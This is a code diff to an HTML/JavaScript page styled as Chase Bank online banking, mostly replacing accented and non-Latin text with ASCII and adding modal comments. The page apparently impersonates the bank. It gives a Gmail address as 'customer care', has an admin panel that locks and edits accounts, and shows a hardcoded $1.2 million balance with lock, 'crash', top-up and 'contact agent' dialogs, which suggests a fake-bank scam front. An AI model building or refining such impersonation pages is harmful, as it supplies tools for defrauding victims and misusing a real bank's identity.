@@ -46,12 +46,12 @@
                     <i class="fas fa-globe text-lg"></i>
                 </button>
                 <div id="translatorDropdown" class="translator-dropdown">
-                    <div class="translator-option active" onclick="changeLanguage('en')"><span class="text-lg">🇺🇸</span><span>English</span></div>
-                    <div class="translator-option" onclick="changeLanguage('es')"><span class="text-lg">🇪🇸</span><span>Español</span></div>
-                    <div class="translator-option" onclick="changeLanguage('fr')"><span class="text-lg">🇫🇷</span><span>Français</span></div>
-                    <div class="translator-option" onclick="changeLanguage('de')"><span class="text-lg">🇩🇪</span><span>Deutsch</span></div>
-                    <div class="translator-option" onclick="changeLanguage('zh')"><span class="text-lg">🇨🇳</span><span>中文</span></div>
-                    <div class="translator-option" onclick="changeLanguage('ar')"><span class="text-lg">🇸🇦</span><span>العربية</span></div>
+                    <div class="translator-option active" onclick="changeLanguage('en')"><span class="text-lg">&#127482;&#127480;</span><span>English</span></div>
+                    <div class="translator-option" onclick="changeLanguage('es')"><span class="text-lg">&#127466;&#127480;</span><span>Espanol</span></div>
+                    <div class="translator-option" onclick="changeLanguage('fr')"><span class="text-lg">&#127467;&#127479;</span><span>Francais</span></div>
+                    <div class="translator-option" onclick="changeLanguage('de')"><span class="text-lg">&#127465;&#127466;</span><span>Deutsch</span></div>
+                    <div class="translator-option" onclick="changeLanguage('zh')"><span class="text-lg">&#127464;&#127475;</span><span>Zhongwen</span></div>
+                    <div class="translator-option" onclick="changeLanguage('ar')"><span class="text-lg">&#127462;&#127486;</span><span>Alarabia</span></div>
                 </div>
             </div>
         </div>
@@ -109,7 +109,7 @@
                     </div>
                 </div>
             </div>
-            <p class="text-center text-blue-200 text-sm mt-6">© 2024 Chase Bank. All rights reserved.</p>
+            <p class="text-center text-blue-200 text-sm mt-6">Copyright 2024 Chase Bank. All rights reserved.</p>
         </div>
     </div>
 
@@ -169,7 +169,7 @@
             <div id="content-overview" class="tab-content active space-y-6">
                 <div class="gradient-chase rounded-2xl p-8 text-white">
                     <h2 class="text-3xl font-bold mb-2">Welcome back, <span id="welcomeName">Patrick</span>!</h2>
-                    <p class="text-blue-100">Here's your financial overview for today.</p>
+                    <p class="text-blue-100">Here is your financial overview for today.</p>
                 </div>
                 <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
                     <div class="bg-gradient-to-br from-[#0C4BB9] to-[#003087] rounded-xl p-6 text-white shadow-lg">
@@ -215,7 +215,7 @@
                         <button onclick="showCheckDeposit()" class="flex flex-col items-center p-6 bg-purple-50 rounded-xl hover:bg-purple-100 transition-colors group">
                             <div class="w-14 h-14 bg-purple-600 rounded-full flex items-center justify-center mb-3 group-hover:scale-110 transition-transform"><i class="fas fa-file-invoice text-white text-xl"></i></div>
                             <span class="font-medium text-gray-900">Check Deposit</span>
-                            <span class="text-xs text-gray-500 mt-1">Scan & Deposit</span>
+                            <span class="text-xs text-gray-500 mt-1">Scan and Deposit</span>
                         </button>
                         <button onclick="showGetCard()" class="flex flex-col items-center p-6 bg-orange-50 rounded-xl hover:bg-orange-100 transition-colors group">
                             <div class="w-14 h-14 bg-orange-600 rounded-full flex items-center justify-center mb-3 group-hover:scale-110 transition-transform"><i class="fas fa-credit-card text-white text-xl"></i></div>
@@ -304,7 +304,7 @@
                         <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                             <div>
                                 <label class="block text-sm font-medium text-gray-700 mb-1">Account Holder Name *</label>
-                                <input type="text" id="transferHolder" placeholder="Enter recipient's full name" class="w-full h-12 px-4 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#0C4BB9]">
+                                <input type="text" id="transferHolder" placeholder="Enter recipient full name" class="w-full h-12 px-4 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#0C4BB9]">
                             </div>
                             <div>
                                 <label class="block text-sm font-medium text-gray-700 mb-1">To Account Number *</label>
@@ -383,37 +383,25 @@
             <div class="grid grid-cols-1 md:grid-cols-4 gap-6 mb-8">
                 <div class="bg-white rounded-xl shadow p-6">
                     <div class="flex items-center justify-between">
-                        <div>
-                            <p class="text-sm text-gray-500">Total Accounts</p>
-                            <p class="text-3xl font-bold">1</p>
-                        </div>
+                        <div><p class="text-sm text-gray-500">Total Accounts</p><p class="text-3xl font-bold">1</p></div>
                         <div class="p-3 bg-blue-100 rounded-lg"><i class="fas fa-users text-blue-600 text-xl"></i></div>
                     </div>
                 </div>
                 <div class="bg-white rounded-xl shadow p-6">
                     <div class="flex items-center justify-between">
-                        <div>
-                            <p class="text-sm text-gray-500">Active Accounts</p>
-                            <p class="text-3xl font-bold text-green-600" id="activeCount">1</p>
-                        </div>
+                        <div><p class="text-sm text-gray-500">Active Accounts</p><p class="text-3xl font-bold text-green-600" id="activeCount">1</p></div>
                         <div class="p-3 bg-green-100 rounded-lg"><i class="fas fa-check-circle text-green-600 text-xl"></i></div>
                     </div>
                 </div>
                 <div class="bg-white rounded-xl shadow p-6">
                     <div class="flex items-center justify-between">
-                        <div>
-                            <p class="text-sm text-gray-500">Locked Accounts</p>
-                            <p class="text-3xl font-bold text-red-600" id="lockedCount">0</p>
-                        </div>
+                        <div><p class="text-sm text-gray-500">Locked Accounts</p><p class="text-3xl font-bold text-red-600" id="lockedCount">0</p></div>
                         <div class="p-3 bg-red-100 rounded-lg"><i class="fas fa-lock text-red-600 text-xl"></i></div>
                     </div>
                 </div>
                 <div class="bg-white rounded-xl shadow p-6">
                     <div class="flex items-center justify-between">
-                        <div>
-                            <p class="text-sm text-gray-500">Total Assets</p>
-                            <p class="text-3xl font-bold" id="totalAssets">$1,200,000.00</p>
-                        </div>
+                        <div><p class="text-sm text-gray-500">Total Assets</p><p class="text-3xl font-bold" id="totalAssets">$1,200,000.00</p></div>
                         <div class="p-3 bg-purple-100 rounded-lg"><i class="fas fa-dollar-sign text-purple-600 text-xl"></i></div>
                     </div>
                 </div>
@@ -468,7 +456,7 @@
         </main>
     </div>
 
-    <!-- Modals -->
+    <!-- Settings Modal -->
     <div id="settingsModal" class="modal">
         <div class="modal-content p-6">
             <div class="flex items-center justify-between mb-6">
@@ -501,6 +489,7 @@
         </div>
     </div>
 
+    <!-- Change Password Modal -->
     <div id="changePasswordModal" class="modal">
         <div class="modal-content p-6 max-w-md">
             <div class="flex items-center justify-between mb-4">
@@ -516,6 +505,7 @@
         </div>
     </div>
 
+    <!-- Change Email Modal -->
     <div id="changeEmailModal" class="modal">
         <div class="modal-content p-6 max-w-md">
             <div class="flex items-center justify-between mb-4">
@@ -531,6 +521,7 @@
         </div>
     </div>
 
+    <!-- PIN Modal -->
     <div id="pinModal" class="modal">
         <div class="modal-content p-6 max-w-sm">
             <div class="flex items-center justify-between mb-4">
@@ -548,6 +539,7 @@
         </div>
     </div>
 
+    <!-- Contact Agent Modal -->
     <div id="contactAgentModal" class="modal">
         <div class="modal-content p-6 max-w-md">
             <div class="flex items-center justify-between mb-4">
@@ -580,6 +572,7 @@
         </div>
     </div>
 
+    <!-- Topup Modal -->
     <div id="topupModal" class="modal">
         <div class="modal-content p-6 max-w-md">
             <div class="flex items-center justify-between mb-4">
@@ -595,6 +588,7 @@
         </div>
     </div>
 
+    <!-- Mobile Deposit Modal -->
     <div id="mobileDepositModal" class="modal">
         <div class="modal-content p-6 max-w-md">
             <div class="flex items-center justify-between mb-4">
@@ -613,6 +607,7 @@
         </div>
     </div>
 
+    <!-- Check Deposit Modal -->
     <div id="checkDepositModal" class="modal">
         <div class="modal-content p-6 max-w-md">
             <div class="flex items-center justify-between mb-4">
@@ -629,13 +624,14 @@
         </div>
     </div>
 
+    <!-- Get Card Modal -->
     <div id="getCardModal" class="modal">
         <div class="modal-content p-6 max-w-md">
             <div class="flex items-center justify-between mb-4">
                 <h3 class="text-xl font-semibold flex items-center gap-2 text-orange-600"><i class="fas fa-credit-card"></i> Request New Card</h3>
                 <button onclick="closeModal('getCardModal')" class="text-gray-400 hover:text-gray-600"><i class="fas fa-times text-xl"></i></button>
             </div>
-            <p class="text-gray-600 mb-4">Choose the type of card you'd like to request.</p>
+            <p class="text-gray-600 mb-4">Choose the type of card you would like to request.</p>
             <div class="grid grid-cols-2 gap-4 mb-4">
                 <button class="p-6 border-2 border-gray-200 rounded-xl hover:border-[#0C4BB9] transition-colors text-center"><div class="w-16 h-10 bg-gradient-to-r from-blue-600 to-blue-800 rounded-lg mx-auto mb-3"></div><p class="font-medium text-gray-900">Debit Card</p><p class="text-xs text-gray-500 mt-1">Instant Issue</p></button>
                 <button class="p-6 border-2 border-gray-200 rounded-xl hover:border-[#0C4BB9] transition-colors text-center"><div class="w-16 h-10 bg-gradient-to-r from-purple-600 to-purple-800 rounded-lg mx-auto mb-3"></div><p class="font-medium text-gray-900">Credit Card</p><p class="text-xs text-gray-500 mt-1">Apply Now</p></button>
@@ -644,6 +640,7 @@
         </div>
     </div>
 
+    <!-- Edit Account Modal -->
     <div id="editAccountModal" class="modal">
         <div class="modal-content p-6 max-w-md">
             <div class="flex items-center justify-between mb-4">
@@ -664,6 +661,7 @@
         </div>
     </div>
 
+    <!-- Lock Account Modal -->
     <div id="lockModal" class="modal">
         <div class="modal-content p-6 max-w-md">
             <div class="flex items-center justify-between mb-4">
@@ -681,6 +679,7 @@
         </div>
     </div>
 
+    <!-- Transfer Review Modal -->
     <div id="reviewModal" class="modal">
         <div class="modal-content p-6 max-w-md">
             <div class="flex items-center justify-between mb-4">
@@ -696,6 +695,7 @@
         </div>
     </div>
 
+    <!-- Crash Modal -->
     <div id="crashModal" class="modal">
         <div class="modal-content p-6 max-w-md">
             <div class="flex items-center justify-between mb-4">
@@ -707,6 +707,7 @@
         </div>
     </div>
 
+    <!-- Contact Us Modal -->
     <div id="contactModal" class="modal">
         <div class="modal-content p-6 max-w-md">
             <div class="flex items-center justify-between mb-4">
@@ -740,11 +741,11 @@
         const CUSTOMER_CARE = { phone: '+1 (555) 123-4567', email: 'agent.chaseservice@gmail.com' };
         const translations = {
             en: { bankTitle: 'Chase Bank', bankSubtitle: 'Online Banking', loginTitle: 'Sign In', loginSubtitle: 'Access your Chase Bank account', emailLabel: 'Email Address', emailPlaceholder: 'Enter your email', passwordLabel: 'Password', passwordPlaceholder: 'Enter your password', rememberMe: 'Remember me', forgotPassword: 'Forgot password?', signIn: 'Sign In', enrollText: 'Not enrolled? Sign up now.', enrollTitle: 'Enroll in Online Banking', enrollSubtitle: 'Create your online banking account', enrollBtn: 'Continue Enrollment', adminAccess: 'Customer Care Admin Access', contactTitle: 'Contact Customer Care', contactDesc: 'Our customer care agents are available 24/7 to assist you with any questions or concerns.', emailLabelContact: 'Email Address', phoneLabel: 'Phone Number', hoursTitle: 'Support Hours', hoursDesc: 'Available 24 hours a day, 7 days a week', closeBtn: 'Close' },
-            es: { bankTitle: 'Chase Bank', bankSubtitle: 'Banca en Línea', loginTitle: 'Iniciar Sesión', loginSubtitle: 'Acceda a su cuenta de Chase Bank', emailLabel: 'Correo Electrónico', emailPlaceholder: 'Ingrese su correo', passwordLabel: 'Contraseña', passwordPlaceholder: 'Ingrese su contraseña', rememberMe: 'Recuérdame', forgotPassword: '¿Olvidó su contraseña?', signIn: 'Iniciar Sesión', enrollText: '¿No está inscrito? Regístrese ahora.', enrollTitle: 'Inscribirse en Banca en Línea', enrollSubtitle: 'Cree su cuenta de banca en línea', enrollBtn: 'Continuar Inscripción', adminAccess: 'Acceso de Administrador', contactTitle: 'Contactar Atención al Cliente', contactDesc: 'Nuestros agentes de atención al cliente están disponibles 24/7 para ayudarle.', emailLabelContact: 'Correo Electrónico', phoneLabel: 'Número de Teléfono', hoursTitle: 'Horario de Atención', hoursDesc: 'Disponible las 24 horas del día, 7 días a la semana', closeBtn: 'Cerrar' },
-            fr: { bankTitle: 'Chase Bank', bankSubtitle: 'Banque en Ligne', loginTitle: 'Connexion', loginSubtitle: 'Accédez à votre compte Chase Bank', emailLabel: 'Adresse Email', emailPlaceholder: 'Entrez votre email', passwordLabel: 'Mot de Passe', passwordPlaceholder: 'Entrez votre mot de passe', rememberMe: 'Se souvenir de moi', forgotPassword: 'Mot de passe oublié?', signIn: 'Se Connecter', enrollText: 'Pas inscrit? Inscrivez-vous maintenant.', enrollTitle: 'Inscription Banque en Ligne', enrollSubtitle: 'Créez votre compte bancaire en ligne', enrollBtn: 'Continuer Inscription', adminAccess: 'Accès Admin Service Client', contactTitle: 'Contacter le Service Client', contactDesc: 'Nos agents sont disponibles 24h/24 et 7j/7 pour vous aider.', emailLabelContact: 'Adresse Email', phoneLabel: 'Numéro de Téléphone', hoursTitle: 'Heures de Support', hoursDesc: 'Disponible 24 heures sur 24, 7 jours sur 7', closeBtn: 'Fermer' },
-            de: { bankTitle: 'Chase Bank', bankSubtitle: 'Online-Banking', loginTitle: 'Anmelden', loginSubtitle: 'Greifen Sie auf Ihr Chase Bank-Konto zu', emailLabel: 'E-Mail-Adresse', emailPlaceholder: 'E-Mail eingeben', passwordLabel: 'Passwort', passwordPlaceholder: 'Passwort eingeben', rememberMe: 'Angemeldet bleiben', forgotPassword: 'Passwort vergessen?', signIn: 'Anmelden', enrollText: 'Nicht registriert? Jetzt anmelden.', enrollTitle: 'Online-Banking Registrierung', enrollSubtitle: 'Erstellen Sie Ihr Online-Banking-Konto', enrollBtn: 'Registrierung Fortsetzen', adminAccess: 'Kundenbetreuung Admin-Zugang', contactTitle: 'Kundenbetreuung Kontaktieren', contactDesc: 'Unsere Kundenbetreuer stehen Ihnen rund um die Uhr zur Verfügung.', emailLabelContact: 'E-Mail-Adresse', phoneLabel: 'Telefonnummer', hoursTitle: 'Supportzeiten', hoursDesc: 'Verfügbar 24 Stunden am Tag, 7 Tage die Woche', closeBtn: 'Schließen' },
-            zh: { bankTitle: 'Chase Bank', bankSubtitle: '网上银行', loginTitle: '登录', loginSubtitle: '访问您的Chase银行账户', emailLabel: '电子邮件', emailPlaceholder: '输入您的电子邮件', passwordLabel: '密码', passwordPlaceholder: '输入您的密码', rememberMe: '记住我', forgotPassword: '忘记密码?', signIn: '登录', enrollText: '未注册? 立即注册。', enrollTitle: '注册网上银行', enrollSubtitle: '创建您的网上银行账户', enrollBtn: '继续注册', adminAccess: '客户服务管理员访问', contactTitle: '联系客户服务', contactDesc: '我们的客户服务代表全天候为您提供帮助。', emailLabelContact: '电子邮件', phoneLabel: '电话号码', hoursTitle: '支持时间', hoursDesc: '全天候24小时，每周7天可用', closeBtn: '关闭' },
-            ar: { bankTitle: 'Chase Bank', bankSubtitle: 'الخدمات المصرفية عبر الإنترنت', loginTitle: 'تسجيل الدخول', loginSubtitle: 'الوصول إلى حساب Chase Bank الخاص بك', emailLabel: 'البريد الإلكتروني', emailPlaceholder: 'أدخل بريدك الإلكتروني', passwordLabel: 'كلمة المرور', passwordPlaceholder: 'أدخل كلمة المرور', rememberMe: 'تذكرني', forgotPassword: 'نسيت كلمة المرور?', signIn: 'تسجيل الدخول', enrollText: 'غير مسجل? سجل الآن.', enrollTitle: 'التسجيل في الخدمات المصرفية', enrollSubtitle: 'إنشاء حسابك المصرفي عبر الإنترنت', enrollBtn: 'متابعة التسجيل', adminAccess: 'وصول مسؤول خدمة العملاء', contactTitle: 'الاتصال بخدمة العملاء', contactDesc: 'وكلاء خدمة العملاء لدينا متاحون على مدار الساعة لمساعدتك.', emailLabelContact: 'البريد الإلكتروني', phoneLabel: 'رقم الهاتف', hoursTitle: 'ساعات الدعم', hoursDesc: 'متاح 24 ساعة في اليوم، 7 أيام في الأسبوع', closeBtn: 'إغلاق' }
+            es: { bankTitle: 'Chase Bank', bankSubtitle: 'Banca en Linea', loginTitle: 'Iniciar Sesion', loginSubtitle: 'Acceda a su cuenta de Chase Bank', emailLabel: 'Correo Electronico', emailPlaceholder: 'Ingrese su correo', passwordLabel: 'Contrasena', passwordPlaceholder: 'Ingrese su contrasena', rememberMe: 'Recuerdame', forgotPassword: 'Olvido su contrasena?', signIn: 'Iniciar Sesion', enrollText: 'No esta inscrito? Registrese ahora.', enrollTitle: 'Inscribirse en Banca en Linea', enrollSubtitle: 'Cree su cuenta de banca en linea', enrollBtn: 'Continuar Inscripcion', adminAccess: 'Acceso de Administrador', contactTitle: 'Contactar Atencion al Cliente', contactDesc: 'Nuestros agentes de atencion al cliente estan disponibles 24/7 para ayudarle.', emailLabelContact: 'Correo Electronico', phoneLabel: 'Numero de Telefono', hoursTitle: 'Horario de Atencion', hoursDesc: 'Disponible las 24 horas del dia, 7 dias a la semana', closeBtn: 'Cerrar' },
+            fr: { bankTitle: 'Chase Bank', bankSubtitle: 'Banque en Ligne', loginTitle: 'Connexion', loginSubtitle: 'Accedez a votre compte Chase Bank', emailLabel: 'Adresse Email', emailPlaceholder: 'Entrez votre email', passwordLabel: 'Mot de Passe', passwordPlaceholder: 'Entrez votre mot de passe', rememberMe: 'Se souvenir de moi', forgotPassword: 'Mot de passe oublie?', signIn: 'Se Connecter', enrollText: 'Pas inscrit? Inscrivez-vous maintenant.', enrollTitle: 'Inscription Banque en Ligne', enrollSubtitle: 'Creez votre compte bancaire en ligne', enrollBtn: 'Continuer Inscription', adminAccess: 'Acces Admin Service Client', contactTitle: 'Contacter le Service Client', contactDesc: 'Nos agents sont disponibles 24h/24 et 7j/7 pour vous aider.', emailLabelContact: 'Adresse Email', phoneLabel: 'Numero de Telephone', hoursTitle: 'Heures de Support', hoursDesc: 'Disponible 24 heures sur 24, 7 jours sur 7', closeBtn: 'Fermer' },
+            de: { bankTitle: 'Chase Bank', bankSubtitle: 'Online-Banking', loginTitle: 'Anmelden', loginSubtitle: 'Greifen Sie auf Ihr Chase Bank-Konto zu', emailLabel: 'E-Mail-Adresse', emailPlaceholder: 'E-Mail eingeben', passwordLabel: 'Passwort', passwordPlaceholder: 'Passwort eingeben', rememberMe: 'Angemeldet bleiben', forgotPassword: 'Passwort vergessen?', signIn: 'Anmelden', enrollText: 'Nicht registriert? Jetzt anmelden.', enrollTitle: 'Online-Banking Registrierung', enrollSubtitle: 'Erstellen Sie Ihr Online-Banking-Konto', enrollBtn: 'Registrierung Fortsetzen', adminAccess: 'Kundenbetreuung Admin-Zugang', contactTitle: 'Kundenbetreuung Kontaktieren', contactDesc: 'Unsere Kundenbetreuer stehen Ihnen rund um die Uhr zur Verfugung.', emailLabelContact: 'E-Mail-Adresse', phoneLabel: 'Telefonnummer', hoursTitle: 'Supportzeiten', hoursDesc: 'Verfugbar 24 Stunden am Tag, 7 Tage die Woche', closeBtn: 'Schliessen' },
+            zh: { bankTitle: 'Chase Bank', bankSubtitle: 'Wangshang Yinhang', loginTitle: 'Denglu', loginSubtitle: 'Fangwen nin de Chase Bank zhanghu', emailLabel: 'Dianzi Youjian', emailPlaceholder: 'Shuru nin de dianzi youjian', passwordLabel: 'Mima', passwordPlaceholder: 'Shuru nin de mima', rememberMe: 'Ji zhu wo', forgotPassword: 'Wang ji mi ma?', signIn: 'Deng lu', enrollText: 'Wei zhu ce? Li ji zhu ce.', enrollTitle: 'Zhu ce Wangshang Yinhang', enrollSubtitle: 'Chuang jian nin de wangshang yinhang zhanghu', enrollBtn: 'Ji xu zhu ce', adminAccess: 'Ke hu fu wu guan li yuan fang wen', contactTitle: 'Lian xi ke hu fu wu', contactDesc: 'Wo men de ke hu fu wu dai biao quan tian hou wei nin ti gong bang zhu.', emailLabelContact: 'Dianzi Youjian', phoneLabel: 'Dianhua Haoma', hoursTitle: 'Zhi chi Shi jian', hoursDesc: 'Quan tian hou 24 xiao shi, mei zhou 7 tian ke yong', closeBtn: 'Guan bi' },
+            ar: { bankTitle: 'Chase Bank', bankSubtitle: 'Alkhadamat Almasrifia Eabr Alintrnt', loginTitle: 'Tasjil Aldukhul', loginSubtitle: 'Alwusul Ila Hisab Chase Bank Alkhas Bik', emailLabel: 'Albarid Aliliktruni', emailPlaceholder: 'Adkhil Baridak Aliliktruni', passwordLabel: 'Kalimat Almarur', passwordPlaceholder: 'Adkhil Kalimat Almarur', rememberMe: 'Tathkarni', forgotPassword: 'Hal Nsiat Kalimat Almarur?', signIn: 'Tasjil Aldukhul', enrollText: 'Ghayr Musajal? Sajil Alaan.', enrollTitle: 'Altasjil fi Alkhadamat Almasrifia', enrollSubtitle: 'Insha Hisabak Almasrifii Eabr Alintrnt', enrollBtn: 'Mutaabaeat Altasjil', adminAccess: 'Wusul Masuul Khadamat Aleumala', contactTitle: 'Alittisal Bikhadamat Aleumala', contactDesc: 'Wukalaa khadamat aleumala ladayna mutahidun Eala madar alsaea limusaeadatik.', emailLabelContact: 'Albarid Aliliktruni', phoneLabel: 'Raqm Alhatif', hoursTitle: 'Saeat Aldaem', hoursDesc: 'Mutah 24 Saeatan fi Alyawm, 7 Ayyam fi Alusbue', closeBtn: 'Ighlaq' }
         };
         let currentLanguage = 'en';
         const userData = { name: 'Patrick Lormard', email: 'patrick.lormard@email.com', accountNumber: '****4532', balance: 1200000, isLocked: false, dob: '22 Aug 1961', location: 'Savannah, Georgia', phone: '+1 (912) 555-0147' };
@@ -917,7 +918,7 @@
             container.innerHTML = results.map(acc => `
                 <div class="border border-gray-200 rounded-lg p-4 hover:border-[#0C4BB9] transition-colors cursor-pointer">
                     <div class="flex items-center justify-between">
-                        <div class="flex items-center gap-4"><div class="w-12 h-12 bg-[#0C4BB9] rounded-lg flex items-center justify-center"><i class="fas fa-university text-white text-xl"></i></div><div><p class="font-semibold text-gray-900">${acc.bankName}</p><p class="text-sm text-gray-500">${acc.accountHolder}</p><p class="text-xs text-gray-400">${acc.accountNumber} • ${acc.accountType}</p></div></div>
+                        <div class="flex items-center gap-4"><div class="w-12 h-12 bg-[#0C4BB9] rounded-lg flex items-center justify-center"><i class="fas fa-university text-white text-xl"></i></div><div><p class="font-semibold text-gray-900">${acc.bankName}</p><p class="text-sm text-gray-500">${acc.accountHolder}</p><p class="text-xs text-gray-400">${acc.accountNumber} - ${acc.accountType}</p></div></div>
                         <div class="text-right"><p class="text-xl font-bold text-gray-900">${formatCurrency(acc.balance)}</p><p class="text-xs text-gray-400">Routing: ${acc.routingNumber}</p></div>
                     </div>
                 </div>`).join('');
@@ -1014,11 +1015,11 @@
 
         document.querySelectorAll('.modal').forEach(modal => { modal.addEventListener('click', (e) => { if (e.target === modal) closeModal(modal.id); }); });
         document.addEventListener('click', (e) => {
-            const dropdown = document.getElementById('notificationDropdown'), bell = document.querySelector('[onclick=\"toggleNotifications()\"]');
+            const dropdown = document.getElementById('notificationDropdown'), bell = document.querySelector('[onclick="toggleNotifications()"]');
             if (!dropdown.contains(e.target) && e.target !== bell && !bell.contains(e.target)) dropdown.classList.remove('active');
         });
         document.addEventListener('click', (e) => {
-            const dropdown = document.getElementById('translatorDropdown'), btn = document.querySelector('[onclick=\"toggleTranslator()\"]');
+            const dropdown = document.getElementById('translatorDropdown'), btn = document.querySelector('[onclick="toggleTranslator()"]');
             if (!dropdown.contains(e.target) && e.target !== btn && !btn.contains(e.target)) dropdown.classList.remove('active');
         });
 
@@ -1033,7 +1034,7 @@
             const forgotBtn = document.querySelector('#loginOptions button'); if (forgotBtn) forgotBtn.textContent = t.forgotPassword;
             document.getElementById('loginBtnText').textContent = isEnrollMode ? t.enrollBtn : t.signIn;
             document.getElementById('enrollToggle').textContent = isEnrollMode ? t.enrollText.replace('Not enrolled?', 'Already enrolled?').replace('Sign up now.', 'Sign in.') : t.enrollText;
-            const adminBtn = document.querySelector('[onclick=\"showAdminLogin()\"]'); if (adminBtn) adminBtn.innerHTML = `<i class=\"fas fa-shield-alt\"></i> ${t.adminAccess}`;
+            const adminBtn = document.querySelector('[onclick="showAdminLogin()"]'); if (adminBtn) adminBtn.innerHTML = `<i class="fas fa-shield-alt"></i> ${t.adminAccess}`;
             document.getElementById('contactTitle').textContent = t.contactTitle; document.getElementById('contactDesc').textContent = t.contactDesc;
             document.getElementById('emailLabel').textContent = t.emailLabelContact; document.getElementById('phoneLabel').textContent = t.phoneLabel;
             document.getElementById('hoursTitle').textContent = t.hoursTitle; document.getElementById('hoursDesc').textContent = t.hoursDesc; document.getElementById('closeContactBtn').textContent = t.closeBtn;
